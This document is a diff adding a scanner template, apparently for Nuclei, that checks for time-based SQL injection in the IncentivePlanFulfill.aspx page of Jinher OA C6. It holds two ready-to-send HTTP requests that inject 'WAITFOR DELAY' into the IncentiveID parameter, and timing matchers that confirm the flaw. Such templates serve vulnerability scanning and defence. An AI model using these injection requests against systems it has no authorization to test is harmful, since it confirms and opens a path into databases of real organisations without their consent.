@@ -1,0 +1,31 @@
+id: jinher-C6-IncentivePlanFulfill-sqli
+
+info:
+  name: 金和OA-C6-IncentivePlanFulfill-sql注入
+  author: HuanXiong
+  severity: high
+
+  tags: SQL Injection
+
+http:
+  - raw: 
+      - |
+        @timeout: 30s
+        GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx/?IncentiveID=1+WAITFOR+DELAY+%270:0:3%27--&TVersion=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Connection: close
+
+      - |
+        @timeout: 30s
+        GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx/?IncentiveID=1+WAITFOR+DELAY+%270:0:6%27--&TVersion=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Connection: close
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
